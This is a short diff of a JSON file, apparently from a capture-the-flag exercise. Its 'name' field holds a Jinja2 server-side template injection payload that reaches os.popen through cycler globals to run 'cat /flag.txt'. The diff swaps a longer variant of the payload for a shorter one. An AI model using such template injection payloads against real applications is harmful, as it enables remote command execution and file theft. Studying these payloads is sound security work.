@@ -1,4 +1,4 @@
 {
-    "name": "{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('cat /flag.txt').read() }}",
-    "data": [1, 2, 3]
+  "name": "{{ cycler.__init__.__globals__.os.popen('cat /flag.txt').read() }}",
+  "data": [1, 2, 3]
 }
